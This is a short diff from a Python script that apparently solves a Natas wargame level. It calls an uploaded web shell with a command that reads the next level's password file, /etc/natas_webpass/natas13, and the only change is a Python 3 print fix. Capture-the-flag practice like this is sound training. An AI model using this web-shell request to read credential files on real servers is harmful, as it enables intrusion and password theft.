@@ -14,4 +14,4 @@ soup = bs4.BeautifulSoup(response.text, 'lxml')
 upload_link = soup.find('a')
 webshell_url = url + "/"+ upload_link['href']
 webshell_response = session.get(webshell_url+"?c=cat /etc/natas_webpass/natas13", auth = (username,password))
-print webshell_response.text
+print(webshell_response.text)
